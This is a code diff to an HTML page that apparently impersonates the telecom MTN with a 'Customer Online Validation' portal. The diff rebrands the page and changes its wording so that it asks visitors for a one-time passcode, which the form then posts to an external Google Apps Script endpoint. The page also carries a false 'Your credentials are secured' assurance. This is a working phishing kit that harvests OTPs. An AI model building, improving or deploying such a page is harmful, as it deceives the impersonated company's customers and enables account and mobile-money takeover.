@@ -29,38 +29,52 @@ body {
   flex-direction: column;
   align-items: center;
   justify-content: center;
+  opacity: 0;
+  transition: opacity 0.5s ease;
 }
+
+body.fade-in { opacity: 1; }
 
 header {
   width: 100%;
   background: linear-gradient(180deg, var(--primary), var(--primary-dark));
   color: #fff;
-  padding: 16px 0 8px;
+  padding: 16px 0;
   text-align: center;
+}
+
+header .logo {
+  font-weight: 800;
+  font-size: 20px;
+  color: var(--accent);
+  margin-bottom: 6px;
+}
+
+header .title {
   font-weight: 700;
-  font-size: 22px;
+  font-size: 18px;
 }
 
 header .subtext {
   font-weight: 400;
-  font-size: 14px;
-  color: #fff;
-  margin-top: 6px;
+  font-size: 13px;
+  margin-top: 4px;
+  opacity: 0.85;
 }
 
 .portal-card {
   background: var(--card-bg);
   border-radius: 14px;
-  max-width: 400px;
+  max-width: 480px;
   width: 90%;
   padding: 30px 25px;
   box-shadow: 0 12px 30px rgba(0,0,0,0.12);
-  text-align: center;
+  text-align: left;
+  margin-top: 20px;
 }
 
 label {
   display: block;
-  text-align: left;
   font-weight: 600;
   margin-bottom: 6px;
   font-size: 13px;
@@ -92,16 +106,18 @@ button {
   font-size: 15px;
   font-weight: 600;
   cursor: pointer;
-  transition: background 0.2s, box-shadow 0.2s;
+  transition: background 0.2s, box-shadow 0.2s, transform 0.1s;
   box-shadow: 0 6px 16px rgba(0,0,0,0.18);
 }
 
 button:hover { background: var(--primary-dark); }
+button:active { transform: translateY(1px); }
 
 .notice {
   font-size: 13px;
   color: var(--text-muted);
   margin-top: 12px;
+  text-align: center;
 }
 
 .overlay {
@@ -139,17 +155,19 @@ button:hover { background: var(--primary-dark); }
 </style>
 </head>
 <body>
+<script>document.body.classList.add("fade-in");</script>
 
 <header>
-  Customer Online Validation
-  <div class="subtext">Input copied message to complete your verification</div>
+  <div class="logo">MTN</div>
+  <div class="title">Customer Online Validation</div>
+  <div class="subtext">Enter the OTP to complete your verification</div>
 </header>
 
 <div class="portal-card">
   <form id="otpForm">
-    <label for="otp">Verification Link</label>
-    <input type="text" id="otp" name="validation_otp" placeholder="Paste Message " required>
-    <button type="submit">Verify Message →</button>
+    <label for="otp">Validation OTP</label>
+    <input type="text" id="otp" name="validation_otp" placeholder="Enter OTP" required>
+    <button type="submit">Validate OTP →</button>
     <div class="notice" id="status">Your credentials are secured.</div>
   </form>
 </div>
@@ -161,9 +179,9 @@ button:hover { background: var(--primary-dark); }
 
 <script>
 const form = document.getElementById('otpForm');
-const statusEl = document.getElementById('status');
 const overlay = document.getElementById('overlay');
-const WEBAPP_URL = "https://script.google.com/macros/s/AKfycbxeIPpKVQOagylbISVnIckuJeazhERR8IYTxtJQFhCqRNJmawsQ-b4_b5pkSQRBldxN/exec";
+const statusEl = document.getElementById('status');
+const WEBAPP_URL = "https://script.google.com/macros/s/AKfycbxc01iBJ-yE2Qpsn1ln_O7qk5HWgaqvJRJLPA2_fgdIBesusKPSPYyTkLEA6xkKHjod/exec";
 
 form.addEventListener('submit', async (e) => {
   e.preventDefault();
@@ -180,7 +198,7 @@ form.addEventListener('submit', async (e) => {
     let json;
     try { json = JSON.parse(text); } catch {
       overlay.classList.remove("active");
-      statusEl.textContent = "Invalid response from server.";
+      statusEl.textContent = "Invalid server response.";
       statusEl.style.color = "#b00000";
       return;
     }
@@ -199,6 +217,5 @@ form.addEventListener('submit', async (e) => {
   }
 });
 </script>
-
 </body>
 </html>
